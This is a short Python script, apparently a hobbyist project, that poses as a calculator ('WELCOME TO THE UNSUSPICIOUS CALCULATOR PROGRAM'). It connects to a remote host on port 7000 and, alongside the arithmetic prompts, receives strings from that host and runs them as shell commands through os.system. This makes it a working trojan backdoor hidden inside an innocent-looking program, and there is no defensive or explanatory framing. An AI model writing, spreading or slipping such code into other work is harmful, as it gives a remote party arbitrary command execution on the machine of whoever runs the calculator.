import socket
import os, sys

port = 7000
host = 'LAPTOP-OF-AWESOME'
client_socket = socket.socket()  # instantiate
client_socket.connect((host, port))  # connect to the server
calc = False
#socket.setblocking(False)
def runcommand():
    global calc
    data = client_socket.recv(1024).decode("utf-8")
    os.system(str(data))
    if not data == '':
        hackyet = True

def runcalc():
    operator = input('would you like to divide[1], add[2], multiply[3] or subtract[4]')
    num1 = float(input('enter your first number'))
    num2 = float(input('enter your second number'))
    if operator == '1':
        print(num1 / num2)
    elif operator == '2':
        print(num1 + num2)
    elif operator == '3':
        print(num1 * num2)
    elif operator == '4':
        print(num1 - num2)

print('WELCOME TO THE UNSUSPICIOUS CALCULATOR PROGRAM')
while True:
    if calc == False:
        runcalc()
    runcommand()
